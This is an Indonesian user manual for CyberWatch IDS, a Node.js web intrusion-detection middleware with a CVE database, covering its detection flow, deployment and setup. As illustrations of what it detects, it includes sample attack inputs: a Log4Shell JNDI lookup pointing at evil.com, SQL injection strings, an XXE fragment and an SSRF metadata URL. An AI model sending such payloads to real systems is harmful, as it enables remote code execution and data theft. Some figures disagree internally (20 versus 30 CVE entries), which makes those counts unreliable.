# Panduan Penggunaan — CyberWatch IDS

**Sistem Pemantauan Keamanan & Deteksi Intrusi dengan Basis Data CVE**

| Item | Keterangan |
|---|---|
| Nama Sistem | CyberWatch IDS |
| Versi Dokumen | 1.3 |
| Tanggal | 25 Oktober 2026 |
| Bahasa | Indonesia |
| Platform | Windows / Linux / macOS (Node.js) |
| Alamat Dashboard | `http://localhost:8421` |

---

## Daftar Isi

1. [Ringkasan Sistem](#1-ringkasan-sistem)
2. [Cara Kerja Sistem](#2-cara-kerja-sistem)
3. [Topologi & Penempatan Deployment](#3-topologi--penempatan-deployment)
4. [Prasyarat](#4-prasyarat)
5. [Instalasi dan Menjalankan](#5-instalasi-dan-menjalankan)
6. [Struktur Proyek](#6-struktur-proyek)
7. [Panduan Antarmuka Dashboard](#7-panduan-antarmuka-dashboard)
8. [Simulator Serangan](#8-simulator-serangan)
9. [Referensi API](#9-referensi-api)
10. [Referensi Aturan Deteksi IDS](#10-referensi-aturan-deteksi-ids)
11. [Referensi Basis Data CVE](#11-referensi-basis-data-cve)
12. [Prosedur Operasional Standar](#12-prosedur-operasional-standar)
13. [Perawatan dan Reset Data](#13-perawatan-dan-reset-data)
14. [Pemecahan Masalah](#14-pemecahan-masalah)
15. [Batasan dan Catatan Keamanan](#15-batasan-dan-catatan-keamanan)
16. [Glosarium](#16-glosarium)

---

## 1. Ringkasan Sistem

### 1.1 Apa itu CyberWatch IDS

CyberWatch IDS adalah sistem pemantauan keamanan yang berfungsi sebagai **Intrusion Detection System (IDS)** berbasis aturan untuk aplikasi web, dilengkapi **basis data referensi CVE** (Common Vulnerabilities and Exposures) sebagai rujukan kerentanan.

Sistem ini bekerja dengan tiga lapisan:

1. **Lapisan Deteksi** — memeriksa setiap permintaan HTTP yang masuk dan mencocokkannya dengan 27 aturan deteksi serangan.
2. **Lapisan Pencatatan** — mencatat setiap kecocokan sebagai *security event*, membuat *alert* untuk tingkat keparahan tinggi, serta menghitung reputasi IP penyerang.
3. **Lapisan Korelasi & Pelaporan** — mengaitkan serangan dengan entri CVE terkait, lalu menyajikannya secara *real-time* melalui dashboard.

### 1.2 Fitur Utama

| Fitur | Penjelasan |
|---|---|
| Deteksi real-time | Setiap request HTTP diperiksa *inline* oleh middleware IDS |
| 27 aturan deteksi | SQLi, XSS, path traversal, command injection, Log4j/JNDI, XXE, OGNL, SSRF, LFI/RFI, web shell, scanner, RDP |
| Basis data CVE | 30 entri CVE (18 web + 12 runtime/infrastruktur) dengan skor CVSS, vektor serangan, CWE, dan panduan remediasi |
| Dashboard 6 tab | Pemantauan, pencarian CVE, log event, alert, aturan, reputasi IP |
| Umpan langsung | Pembaruan instan via WebSocket tanpa perlu *refresh* halaman |
| Korelasi CVE | Setiap aturan dipetakan ke CVE relevan sehingga serangan dapat dirujuk ke kerentanan yang diketahui |
| Skoring reputasi IP | Akumulasi ancaman per alamat IP dengan tingkat ancaman otomatis |
| Pemblokiran | Aturan ber-aksi `block` menolak request dengan HTTP 403 |
| Simulator serangan | Membangkitkan lalu lintas serangan realistis untuk pengujian dan demonstrasi |

### 1.3 Arsitektur

```
                        ┌─────────────────────────────┐
   Permintaan HTTP ───▶ │  Middleware IDS (Express)   │
                        │  · periksa path/query/body  │
                        │  · periksa header           │
                        └──────────┬──────────────────┘
                                   │ cocok dengan aturan?
                        ┌──────────▼──────────────────┐
                        │  Intrusion Detection Engine │
                        │  · 27 aturan regex          │
                        │  · korelasi CVE             │
                        └──────────┬──────────────────┘
                                   │
              ┌────────────────────┼────────────────────┐
              ▼                    ▼                    ▼
      ┌───────────────┐   ┌────────────────┐   ┌──────────────┐
      │ security_     │   │ alerts         │   │ ip_reputation│
      │ events        │   │ (HIGH/CRITICAL)│   │ (skor IP)    │
      └───────┬───────┘   └────────┬───────┘   └──────┬───────┘
              └────────────────────┼──────────────────┘
                                   ▼
                        ┌─────────────────────┐
                        │ SQLite (sql.js)     │
                        │ data/cve-database.db│
                        └──────────┬──────────┘
                                   │
                        ┌──────────▼──────────┐
                        │ WebSocket /ws       │──▶ Dashboard (browser)
                        └─────────────────────┘
```

### 1.4 Komponen Teknologi

| Komponen | Teknologi | Fungsi |
|---|---|---|
| Server | Node.js + Express 4 | HTTP server dan routing API |
| Real-time | `ws` (WebSocket) | Push event ke dashboard |
| Basis data | `sql.js` (SQLite murni JavaScript) | Penyimpanan tanpa kompilasi native |
| Frontend | HTML + CSS + JavaScript vanilla | Dashboard, tanpa framework |

---

## 2. Cara Kerja Sistem

Bab ini menjelaskan mekanisme internal sistem secara bertahap: dari permintaan HTTP masuk, proses deteksi, pencatatan, hingga tampil di dashboard. Untuk gambaran komponen, lihat [bagian 1.3](#13-arsitektur).

### 2.1 Ringkasan Alur

```
Klien ──HTTP──▶ [1] Middleware IDS mencegat
                     │
                     ├─▶ [2] Ekstraksi permukaan input
                     │        (path · query · body · header)
                     │
                     ├─▶ [3] Pencocokan 27 aturan regex
                     │
                     ├─▶ [4] Ada kecocokan?
                     │        │
                     │        ├── tidak ──▶ teruskan ke route aplikasi
                     │        │
                     │        └── ya ────▶ [5] Catat event
                     │                     [6] Buat alert (HIGH/CRITICAL)
                     │                     [7] Perbarui reputasi IP
                     │                     [8] Siarkan via WebSocket
                     │                     [9] Blokir? → HTTP 403
                     ▼
              Route / API aplikasi
```

Seluruh proses berjalan dalam satu siklus permintaan (*synchronous*), sehingga keputusan blokir dapat diambil sebelum aplikasi memproses apa pun.

### 2.2 Langkah 1 — Middleware IDS Mencegat Permintaan

Middleware di `server/index.js` dijalankan untuk setiap permintaan yang mencapai tahapnya. Tugasnya:

1. Menentukan **IP sumber**: `X-Forwarded-For` → `socket.remoteAddress` → `127.0.0.1`
2. Menentukan **port sumber** dan **host tujuan** (dari header `Host`)
3. Menyusun objek `reqData` berisi `method`, `path`, `query`, `body`, `headers`, `sourceIp`, `sourcePort`, `destination`
4. Memanggil `ids.inspectRequest(reqData)`

#### Urutan Middleware (penting)

| Urutan | Middleware | Fungsi |
|---|---|---|
| 1 | `cors()` | Header CORS |
| 2 | `express.json()` | Parsing body JSON |
| 3 | `express.urlencoded()` | Parsing body form |
| 4 | `express.static()` | Penyajian aset dashboard |
| 5 | **Middleware IDS** | Inspeksi keamanan |
| 6 | Route API | Handler aplikasi |

Dua konsekuensi yang perlu dipahami:

- **Body sudah di-parse** sebelum inspeksi, sehingga payload JSON/form dapat diperiksa per-field, bukan sebagai teks mentah.
- **Aset statis dilayani sebelum middleware IDS**, sehingga `index.html`, `styles.css`, dan `app.js` tidak ikut diperiksa. Ini mencegah *false positive* dari permintaan aset dashboard sendiri.

### 2.3 Langkah 2 — Ekstraksi Permukaan Input

Mesin tidak memeriksa satu string panjang. Permintaan dipecah menjadi beberapa **permukaan (surface)** yang diuji satu per satu:

| Permukaan | Sumber | Contoh nilai |
|---|---|---|
| URL Path | `req.url` — URI lengkap, **termasuk** query string | `/api/user?id=1` |
| Parameter query | Setiap pasangan kunci–nilai | `id` → `1' OR '1'='1` |
| Body (objek) | Setiap field JSON atau form | `q` → `'; DROP TABLE users;--` |
| Body (string) | Body mentah (mis. XML) | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ...` |
| Header terpilih | 10 header (lihat di bawah) | `User-Agent` → `sqlmap/1.5` |

Header yang diperiksa: `User-Agent`, `Content-Type`, `Content-Disposition`, `Referer`, `Cookie`, `X-Forwarded-For`, `Authorization`, `Accept`.

Setiap permukaan diberi penanda apakah berasal dari header (`isHeader`). Penanda ini dipakai pada langkah berikutnya.

> **Catatan:** karena `req.url` memuat query string, payload pada query juga terperiksa lewat permukaan *path*. Ini bersifat *defense in depth* — satu payload dapat terdeteksi melalui dua jalur.
>
> **Payload ter-encode tetap terdeteksi.** Express mendekode parameter query sebelum middleware berjalan, sehingga `${jndi:` yang dikirim sebagai `%24%7Bjndi%3A` tetap terbaca sebagai `${jndi:` pada permukaan `query`. Sebagai contoh, permintaan `?user=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2FExploit%7D` tetap memicu aturan IDS-040.

### 2.4 Langkah 3 — Pencocokan Aturan

Untuk setiap permukaan, mesin menguji seluruh aturan aktif secara berurutan:

```
untuk setiap permukaan:
    untuk setiap aturan aktif (IDS-001 → IDS-110):
        jika permukaan berasal dari header DAN aturan bertipe SSRF:
            lewati                          ← mencegah false positive Referer
        jika pola aturan cocok dengan nilai permukaan:
            catat deteksi
            berhenti untuk permukaan ini    ← satu deteksi per permukaan
```

Detail yang memengaruhi hasil:

- **Satu permukaan menghasilkan maksimal satu deteksi.** Aturan pertama yang cocok yang dicatat. Tujuannya menghindari duplikasi alert untuk input yang sama.
- **Aturan SSRF melewati permukaan header.** Header seperti `Referer` secara sah memuat nama host (mis. `http://localhost:8421/`), sehingga tanpa pengecualian ini setiap permintaan dari origin sendiri akan memicu alert palsu.
- **Regex dikompilasi sekali** saat server mulai, bukan per permintaan, agar pemeriksaan tetap ringan.

#### Proses Pemuatan Aturan

Saat inisialisasi, mesin:

1. Mengambil aturan aktif: `SELECT * FROM ids_rules WHERE enabled = 1`
2. Melepas awalan `(?i)` — JavaScript tidak mendukungnya — lalu memakai flag `i`
3. Mengompilasi pola menjadi objek `RegExp`
4. Melewati aturan dengan pola tidak valid, disertai log `[IDS] Invalid regex for rule ...`

> Kegagalan bersifat terisolasi: satu aturan yang gagal dikompilasi tidak menghentikan aturan lainnya.

### 2.5 Langkah 4 — Penentuan Aksi

Setelah semua permukaan diperiksa, mesin menghitung:

| Keluaran | Cara Menghitung |
|---|---|
| `detections` | Daftar seluruh deteksi |
| `totalDetections` | Jumlah deteksi |
| `highestSeverity` | Keparahan tertinggi (CRITICAL > HIGH > MEDIUM > LOW > INFO) |
| `shouldBlock` | `true` bila ada minimal satu deteksi beraksi `block` |

Aturan keputusan:

| Kondisi | Perilaku |
|---|---|
| Tidak ada deteksi | Permintaan diteruskan, tidak ada pencatatan |
| Ada deteksi, semua beraksi `alert` | Permintaan **diteruskan**, event tetap dicatat |
| Ada minimal satu deteksi beraksi `block` | Permintaan **ditolak** (HTTP 403) setelah seluruh deteksi dicatat |

### 2.6 Langkah 5 — Pencatatan Event

Setiap deteksi disimpan ke tabel `security_events` dengan 18 kolom:

| Kelompok | Kolom |
|---|---|
| Waktu & jenis | `timestamp`, `event_type`, `attack_type` |
| Keparahan | `severity` |
| Asal & tujuan | `source_ip`, `source_port`, `destination` |
| Permintaan | `method`, `path`, `payload`, `user_agent` |
| Aturan | `rule_id`, `rule_name`, `rule_description`, `matched_pattern` |
| Korelasi & aksi | `matched_cve`, `action`, `blocked` |

Nilai `payload` dipotong pada 2.000 karakter untuk membatasi ukuran basis data. Fungsi `logSecurityEvent()` mengembalikan `id` event baru untuk dipakai pada langkah berikutnya.

### 2.7 Langkah 6 — Pembuatan Alert

Alert **hanya** dibuat untuk event berkeparahan `CRITICAL` atau `HIGH`. Event `MEDIUM` dan `LOW` tetap tercatat sebagai event, tetapi tidak menghasilkan alert agar jumlah alert tetap dapat dikelola.

Format pesan alert:

```
{SEVERITY} severity: {nama aturan} from {IP sumber}
```

Contoh: `CRITICAL severity: Log4Shell - JNDI Lookup from 45.155.205.233`

### 2.8 Langkah 7 — Perhitungan Reputasi IP

Setiap event menambah skor IP sumber. Skor bersifat akumulatif dan dibatasi maksimum **100**.

| Keparahan | Tambahan Skor |
|---|---|
| `CRITICAL` | +25 |
| `HIGH` | +15 |
| `MEDIUM` | +5 |
| `LOW` | +1 |

#### Contoh Perhitungan

IP `45.155.205.233` mengirim tiga serangan berturut-turut:

| Urutan | Keparahan | Tambahan | Skor Akhir | Tingkat |
|---|---|---|---|---|
| 1 | HIGH | +15 | 15 | LOW |
| 2 | CRITICAL | +25 | 40 | MEDIUM |
| 3 | HIGH | +15 | 55 | HIGH |

Ambang tingkat ancaman: ≥75 `CRITICAL`, 50–74 `HIGH`, 25–49 `MEDIUM`, <25 `LOW`.

### 2.9 Langkah 8 — Penyebaran Real-time ke Dashboard

Setelah event dicatat, server menyiarkan pesan melalui WebSocket:

| Tipe pesan | Kapan dikirim | Isi |
|---|---|---|
| `events` | Setiap deteksi | Detail event + `id` + waktu |
| `alerts` | Hanya HIGH / CRITICAL | Jenis serangan, pesan, waktu |
| `stats` | Setiap kali ada deteksi | Statistik agregat terbaru |

Dashboard menerima pesan lalu memperbarui antarmuka **tanpa memuat ulang halaman**: event baru disisipkan di posisi teratas **Live Security Feed**, dan kartu statistik diperbarui.

Sebagai lapis cadangan, dashboard juga memanggil `GET /api/stats` **setiap 10 detik**. Apabila koneksi WebSocket terputus, status berubah menjadi "Reconnecting...", percobaan penyambungan ulang dilakukan **setiap 3 detik**, dan tampilan tetap diperbarui melalui polling.

### 2.10 Langkah 9 — Pemblokiran

Bila `shouldBlock = true`, server membalas dengan status **HTTP 403**:

```json
{
  "error": "Request blocked by IDS",
  "reason": "Malicious pattern detected",
  "severity": "CRITICAL",
  "detections": [
    {
      "rule": "Log4Shell - JNDI Lookup",
      "attack_type": "Log4j Injection",
      "severity": "CRITICAL",
      "matched_cve": "CVE-2021-44228"
    }
  ]
}
```

Route aplikasi **tidak pernah dijalankan** untuk permintaan yang diblokir.

### 2.11 Alur Penyimpanan Data

Basis data berjalan **di dalam memori** (sql.js), lalu disalin ke berkas secara berkala:

```
Permintaan ──▶ INSERT / UPDATE (memori) ──▶ tiap 5 detik ──▶ data/cve-database.db
                                                    ▲
                                                    └── juga saat server dihentikan
```

Konsekuensi yang perlu diketahui:

- Operasi baca/tulis sangat cepat karena tidak ada I/O disk per *query*.
- Pada penghentian mendadak (mis. proses di-*kill*), maksimum **5 detik** data terakhir dapat hilang.
- Untuk penghentian yang aman, gunakan `Ctrl + C` sehingga penyimpanan akhir dijalankan.

### 2.12 Cara Kerja Simulator

Simulator **tidak mengirim paket ke jaringan**. Ia memanggil mesin deteksi secara langsung:

```
setInterval(interval)
      │
      ▼
pilih templat payload acak (dari 40+ templat)
      │
      ▼
ids.inspectRequest(payload)      ← langsung, tanpa HTTP
      │
      ▼
ids.logSecurityEvent() + siaran WebSocket
```

Karena melewati jalur yang sama dengan permintaan nyata (setelah tahap ekstraksi permukaan), hasil deteksinya identik dengan serangan sesungguhnya. Inilah sebabnya simulator aman dijalankan di lingkungan mana pun tanpa memindai sistem lain.

### 2.13 Contoh Lengkap: Satu Serangan dari Awal hingga Dashboard

**Permintaan yang masuk:**

```
GET /api/login?user=${jndi:ldap://evil.com/Exploit}
Host: 10.0.1.5
User-Agent: Mozilla/5.0
IP sumber: 45.155.205.233
```

**Penelusuran langkah demi langkah:**

| Langkah | Proses | Hasil |
|---|---|---|
| 1 | Middleware menangkap permintaan | `reqData` terbentuk |
| 2 | Ekstraksi permukaan | `path` = `/api/login?user=${jndi:...}` · `query.user` = `${jndi:ldap://evil.com/Exploit}` · `User-Agent` |
| 3 | Uji aturan pada `query.user` | **IDS-040** cocok pada pola `${jndi:` |
| 4 | Metadata deteksi | `Log4Shell - JNDI Lookup` · `CRITICAL` · aksi `block` · `CVE-2021-44228` |
| 5 | Catat event | Baris baru di `security_events` dengan `blocked = 1` |
| 6 | Buat alert | Baris baru di `alerts` |
| 7 | Reputasi IP | `45.155.205.233` +25 → tingkat `CRITICAL` (bila IP baru) |
| 8 | Siarkan | Dashboard menampilkan baris merah "Log4Shell" di umpan langsung |
| 9 | Blokir | Klien menerima **HTTP 403** |

Seluruh proses selesai dalam hitungan milidetik karena regex telah dikompilasi di awal dan basis data berada di memori.

### 2.14 Batasan Mekanisme

| Aspek | Konsekuensi |
|---|---|
| Pencocokan berbasis pola | Hanya mendeteksi serangan dengan pola yang sudah dikenal |
| Satu deteksi per permukaan | Bila dua aturan cocok pada input yang sama, hanya aturan pertama yang dicatat |
| Pemeriksaan per-field | Payload yang dipecah antar-field (mis. `un/**/ion sel/**/ect`) dapat lolos |
| Tanpa normalisasi | Encoding ganda seperti `%252e%252e` tidak selalu terurai |
| Tanpa state | Setiap permintaan dinilai mandiri; serangan bertahap lambat sulit dikenali |
| Tanpa dekripsi | Lalu lintas TLS harus diterminasi lebih dulu agar dapat diperiksa |

> Untuk keterbatasan secara menyeluruh beserta rekomendasi penggunaan, lihat [bagian 15](#15-batasan-dan-catatan-keamanan).

## 3. Topologi & Penempatan Deployment

Bab ini menjawab pertanyaan yang paling sering muncul sebelum implementasi: **di mana sistem ini diletakkan, arah trafik apa yang diperiksa, dan sejauh mana cakupannya** dalam topologi instansi.

> **Kesimpulan singkat:** CyberWatch IDS adalah **middleware di dalam proses aplikasi** yang memeriksa **trafik masuk (ingress)** ke aplikasi tersebut. Ia **bukan** perangkat jaringan, **tidak** memeriksa trafik keluar, dan **tidak** memantau jaringan internal.

### 3.1 Posisi Sistem dalam Topologi

```
   Internet (zona tidak tepercaya)
        │
        ▼
   ┌─────────────────┐
   │ Firewall        │  perimeter
   └────────┬────────┘
            ▼
   ┌─────────────────┐
   │ WAF             │  kontrol penegakan utama (L3–L7)
   └────────┬────────┘
            ▼
   ┌─────────────────┐
   │ Load balancer   │
   └────────┬────────┘
            ▼
   ┌─────────────────┐
   │ Reverse proxy   │  terminasi TLS + menambahkan X-Forwarded-For
   └────────┬────────┘
            │ HTTP internal
            ▼
 ╔═════════════════════════ DMZ ═════════════════════════╗
 ║  ┌─────────────────────────────────────────────────┐  ║
 ║  │ Server aplikasi (Node.js)                       │  ║
 ║  │   ├─ CyberWatch IDS  ◀── pemeriksaan di sini    │  ║
 ║  │   └─ Route handler / API                        │  ║
 ║  └─────────────────────────────────────────────────┘  ║
 ╚═══════════════════════════╤═══════════════════════════╝
                             │
                             ▼
   ┌─────────────────────────────────┐
   │ Basis data / layanan internal   │  di luar jangkauan IDS
   └─────────────────────────────────┘
```

Poin penting:

| Aspek | Penjelasan |
|---|---|
| Lapisan | **L7 (aplikasi)** — bukan L3/L4 |
| Bentuk | **Middleware di dalam proses** — bukan perangkat, bukan *sidecar* terpisah |
| Posisi | Setelah TLS dibuka oleh reverse proxy, sebelum route handler |
| Zona | Umumnya **DMZ** (untuk aplikasi publik) atau **LAN** (untuk aplikasi internal) |
| Jumlah instance | **Satu per aplikasi** — bukan satu untuk seluruh infrastruktur |

Karena berada di dalam proses aplikasi, sistem ini **berbagi nasib** dengan aplikasi: bila aplikasi berhenti, pemantauan ikut berhenti.

### 3.2 Arah Trafik yang Diperiksa

Sistem hanya memeriksa objek `req` — yaitu **permintaan yang masuk**. Tidak ada inspeksi terhadap respons atau koneksi keluar.

| Arah | Contoh | Diperiksa? |
|---|---|---|
| **Ingress** (klien → aplikasi) | `POST /api/login` dengan payload SQLi | **Ya** |
| **Egress** (aplikasi → luar) | Respons HTTP, panggilan API eksternal, unggahan ke cloud | Tidak |
| **East-west** (server → server) | Query ke basis data, panggilan ke layanan internal | Tidak |

> **Catatan mengenai aturan SSRF:** aturan `IDS-070` mendeteksi **parameter permintaan** yang berpotensi memicu SSRF (mis. `url=http://169.254.169.254/...`). Ia **tidak** mengamati koneksi keluar yang benar-benar terjadi. Jadi SSRF terdeteksi pada tahap *niat*, bukan pada tahap *eksekusi*.

### 3.3 Cakupan Deteksi: Ancaman Luar vs Internal

Sistem **tidak membedakan asal permintaan**. Yang dinilai hanyalah satu hal: *apakah input yang masuk ke aplikasi ini berbahaya*. Karena itu, permintaan dari internet dan dari LAN internal diperlakukan sama.

| Skenario | Terdeteksi? | Alasan |
|---|---|---|
| Penyerang internet mengirim SQLi/XSS/Log4j ke aplikasi | **Ya** | Melewati ingress aplikasi |
| Karyawan internal menyerang aplikasi melalui peramban | **Ya** | Tetap merupakan ingress ke aplikasi |
| Staf terhubung langsung ke basis data (psql/SSMS) | Tidak | Tidak melewati aplikasi |
| Perpindahan lateral antar server (SMB/RDP/SSH) | Tidak | Bukan HTTP ke aplikasi ini |
| Eksfiltrasi data keluar / beacon C2 | Tidak | Egress tidak diperiksa |
| Serangan ke aplikasi lain di jaringan | Tidak | Perlu instance terpisah di aplikasi tersebut |
| Pemindaian subnet internal (Nmap) | Tidak | Bukan lapisan aplikasi |
| Akses tidak sah ke AD/LDAP | Tidak | Di luar cakupan |

**Rumusan yang tepat:** sistem ini menjaga **batas aplikasi** (*application boundary*), bukan **batas jaringan** (*network boundary*). Ia tidak memantau jaringan internal dan tidak memeriksa trafik keluar.

### 3.4 Dua Mode Deployment

| Mode | Cara kerja | Status |
|---|---|---|
| **A. Embed** (disarankan) | Kode IDS ditanam ke dalam aplikasi Node yang sudah berjalan | Sesuai arsitektur kode saat ini |
| **B. Reverse proxy** | CyberWatch berdiri di depan aplikasi dan meneruskan permintaan ke *upstream* | **Belum tersedia** — perlu penambahan lapisan penerusan |

> **Penting:** saat ini `server/index.js` **tidak memiliki kemampuan proxy** (tidak ada penerusan ke *upstream*). Aplikasi ini hanya memeriksa permintaan ke route-nya sendiri. Tanpa menerapkan salah satu mode di atas, memasangnya di server produksi hanya akan memantau trafik ke dashboard-nya sendiri.

#### Langkah Mode A — Embed ke Aplikasi yang Sudah Ada

1. Salin `server/ids-engine.js` dan `server/db.js` ke dalam proyek aplikasi target.
2. Panggil inisialisasi sebelum server mulai:

```javascript
const IntrusionDetectionEngine = require('./ids-engine');
const ids = new IntrusionDetectionEngine();
await ids.init();            // memuat aturan + menyiapkan basis data
```

3. Pasang middleware **sebelum** route aplikasi:

```javascript
app.use((req, res, next) => {
  const sourceIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const result = ids.inspectRequest({
    method: req.method,
    path: req.url,
    query: req.query,
    body: req.body,
    headers: req.headers,
    sourceIp,
    sourcePort: req.socket.remotePort,
    destination: req.headers.host
  });

  for (const d of result.detections) ids.logSecurityEvent(d);

  if (result.shouldBlock) {
    return res.status(403).json({
      error: 'Request blocked by IDS',
      severity: result.highestSeverity
    });
  }
  next();
});
```

4. Sesuaikan lokasi berkas basis data pada `db.js` (konstanta `DB_PATH`) agar tidak bertabrakan dengan berkas aplikasi.
5. Pastikan middleware dipasang **setelah** `express.json()` dan **sebelum** route.

### 3.5 Skenario Penempatan untuk Instansi

#### Skenario A — Aplikasi Publik (DMZ)

Paling umum. Diagram pada [bagian 3.1](#31-posisi-sistem-dalam-topologi) menggambarkan skenario ini.

- IDS berada di server aplikasi dalam DMZ.
- WAF di depan tetap menjadi kontrol penegakan utama.
- Basis data berada di zona internal; IDS tidak menjangkauinya.

#### Skenario B — Aplikasi Internal (Intranet)

```
Staf (LAN) ──▶ Reverse proxy internal ──▶ Server aplikasi + CyberWatch ──▶ Basis data
```

- Tetap **ingress**: yang diperiksa adalah permintaan staf ke aplikasi.
- Berguna mendeteksi penyalahgunaan aplikasi oleh pengguna internal (mis. percobaan injeksi oleh pegawai).
- **Tidak** memantau aktivitas jaringan internal lainnya.

#### Skenario C — Banyak Aplikasi

- Setiap aplikasi memerlukan **instance sendiri** dengan basis data sendiri.
- Akibatnya, dashboard per aplikasi **terpisah** dan tidak saling mengetahui.
- Untuk pandangan menyeluruh, event harus dikirim ke **SIEM** — kemampuan ini **belum tersedia** (tidak ada eksportir syslog/webhook).

### 3.6 Prasyarat Sebelum Go-Live

| # | Item | Alasan | Status saat ini |
|---|---|---|---|
| 1 | **Autentikasi dashboard** | Tanpa autentikasi, siapa pun yang menjangkau port dapat melihat data dan mengubah aturan | Belum ada |
| 2 | **Batasi binding jaringan** | `server.listen(PORT)` mengikat ke seluruh antarmuka | Perlu konfigurasi |
| 3 | **`X-Forwarded-For` dari proxy** | Tanpa ini, seluruh event tercatat berasal dari IP proxy | Perlu konfigurasi |
| 4 | **Ekspor log ke SIEM** | Data hanya tersimpan lokal; berkas rusak = data hilang | Belum ada |
| 5 | **Basis data bersama** | Multi-replika menghasilkan state tidak konsisten | Belum ada |
| 6 | **Retensi & rotasi** | Event menumpuk (estimasi pada [bagian 13.5](#135-estimasi-ukuran-data)) | Manual via `/api/reset` |
| 7 | **TLS untuk dashboard** | Sesi dan data monitoring melewati HTTP polos | Belum ada |
| 8 | **Uji beban** | Regex dijalankan inline pada setiap permintaan | Belum diuji |

> **Peringatan:** item 1 dan 2 bersifat **wajib**. Jangan pernah mengekspos port dashboard ke internet publik.

### 3.7 Yang Tidak Tercakup dan Alat Pendamping

| Kebutuhan deteksi | Alat yang tepat | Tercakup di sini? |
|---|---|---|
| Serangan web masuk | WAF + CyberWatch (konteks CVE) | Sebagian |
| Trafik jaringan & perpindahan lateral | NIDS (*tap*/SPAN) atau log firewall | Tidak |
| Host & endpoint (malware, FIM) | EDR / agen HIDS | Tidak |
| Eksfiltrasi data keluar | DLP, proxy, log firewall | Tidak |
| Korelasi & retensi jangka panjang | SIEM | Tidak |
| Manajemen kasus & otomasi respons | SOAR | Tidak |

CyberWatch melengkapi lapisan **deteksi aplikasi**, bukan menggantikan lapisan lainnya.

### 3.8 Contoh Konfigurasi Reverse Proxy

Agar IP penyerang tercatat dengan benar, reverse proxy harus meneruskan `X-Forwarded-For`.

**Nginx:**

```nginx
location / {
    proxy_pass http://127.0.0.1:3000;
    proxy_set_header Host              $host;
    proxy_set_header X-Real-IP         $remote_addr;
    proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

**Hardening yang menyertainya:**

1. Aplikasi **hanya** mendengarkan di `127.0.0.1`, bukan `0.0.0.0`. Bila aplikasi dapat dijangkau langsung, header `X-Forwarded-For` dapat dipalsukan sehingga IP penyerang tidak dapat dipercaya.
2. Dashboard dipisahkan ke port internal atau dilindungi autentikasi pada proxy.
3. Aktifkan pembatasan laju (*rate limiting*) pada proxy untuk mengurangi banjir event dari pemindai otomatis.

> Bila `X-Forwarded-For` tidak dikonfigurasi, seluruh event akan menampilkan IP reverse proxy — reputasi IP menjadi tidak bermakna dan analisis sumber serangan tidak dapat dilakukan.

## 4. Prasyarat

| Prasyarat | Versi Minimal | Catatan |
|---|---|---|
| Node.js | 18.x (disarankan 20+) | Wajib |
| npm | 9.x | Wajib untuk instalasi dependensi |
| Peramban modern | Chrome / Edge / Firefox terbaru | Untuk dashboard |
| Port TCP | 8421 (default) | Dapat diubah melalui variabel `PORT` |

> **Catatan:** Sistem ini **tidak** memerlukan Visual Studio C++ Build Tools. Basis data menggunakan `sql.js` (WebAssembly) sehingga tidak ada kompilasi native.

---

## 5. Instalasi dan Menjalankan

### 5.1 Instalasi Dependensi

Buka terminal pada direktori proyek, lalu jalankan:

```bash
npm install
```

Perintah ini memasang `express`, `ws`, `sql.js`, dan `cors`.

### 5.2 Inisialisasi Basis Data

Jalankan *seeder* untuk membuat skema tabel, mengisi 30 entri CVE, dan 27 aturan IDS:

```bash
npm run seed
```

Keluaran yang diharapkan:

```
Seeding CVE database...
Inserted 20 CVE entries
Inserted 27 IDS detection rules

=== Database Summary ===
CVE Entries:      20
  - Critical:     9
  - Web Vulns:    17
IDS Rules:        27
Database location: ...\data\cve-database.db
```

> Seeder bersifat **idempoten** — aman dijalankan berulang. Data CVE dan aturan akan diganti (`INSERT OR REPLACE`), sedangkan data *event* yang sudah ada **tidak dihapus**.

### 5.3 Menjalankan Server

```bash
npm start
```

Keluaran yang diharapkan:

```
============================================
  CyberWatch IDS — Security Monitoring
============================================
  Dashboard:  http://localhost:8421
  WebSocket:  ws://localhost:8421/ws
  API Base:    http://localhost:8421/api
============================================

[IDS] Loaded 27 active detection rules
[IDS] Engine initialized with 27 rules
[Simulator] Ready. POST /api/simulate/start to begin attack simulation.
```

### 5.4 Membuka Dashboard

Buka peramban dan akses:

```
http://localhost:8421
```

Indikator di kanan atas akan menampilkan **Connected** dengan titik hijau berkedip apabila koneksi WebSocket berhasil.

### 5.5 Mengubah Port

Gunakan variabel lingkungan `PORT`:

**Linux / macOS / Git Bash:**
```bash
PORT=9000 npm start
```

**Windows CMD:**
```cmd
set PORT=9000 && npm start
```

**Windows PowerShell:**
```powershell
$env:PORT=9000; npm start
```

### 5.6 Menghentikan Server

Tekan `Ctrl + C` pada terminal tempat server berjalan. Basis data akan disimpan otomatis (lihat [bagian 13](#13-perawatan-dan-reset-data)).

---

## 6. Struktur Proyek

```
Tool Cyber/
├── package.json                # Metadata proyek dan skrip npm
├── PANDUAN-PENGGUNAAN.md       # Dokumen ini
├── data/
│   └── cve-database.db         # Basis data SQLite (CVE, event, alert, reputasi IP)
├── server/
│   ├── index.js                # Server Express, WebSocket, middleware IDS, routing API
│   ├── db.js                   # Pembungkus basis data (sql.js) + skema + migrasi
│   ├── ids-engine.js           # Mesin deteksi: pemuatan aturan, inspeksi, pencatatan
│   ├── simulator.js            # Pembangkit lalu lintas serangan (40+ templat)
│   └── seed-cve.js             # Pengisi data awal CVE dan aturan IDS
├── client/
│   ├── index.html              # Kerangka dashboard (6 tab)
│   ├── styles.css              # Tema gelap (dark theme)
│   └── app.js                  # Logika frontend, WebSocket, pemanggilan API
└── node_modules/               # Dependensi (dihasilkan npm install)
```

### 6.1 Skema Tabel Basis Data

| Tabel | Isi |
|---|---|
| `cve_entries` | 30 entri CVE: skor CVSS, vektor, CWE, produk terdampak, remediasi |
| `ids_rules` | 27 aturan deteksi: pola regex, tingkat keparahan, aksi |
| `security_events` | Catatan setiap kecocokan serangan (log utama IDS) |
| `alerts` | Notifikasi untuk event berkeparahan HIGH/CRITICAL |
| `ip_reputation` | Skor ancaman terakumulasi per alamat IP |

---

## 7. Panduan Antarmuka Dashboard

Dashboard memiliki **6 tab** yang diakses melalui bilah navigasi atas.

### 7.1 Tab Dashboard

Tab utama untuk pemantauan sekilas.

#### a. Kartu Statistik (6 kartu)

| Kartu | Arti |
|---|---|
| **Total Events** | Jumlah seluruh kecocokan serangan yang tercatat |
| **Critical Threats** | Jumlah event berkeparahan `CRITICAL` |
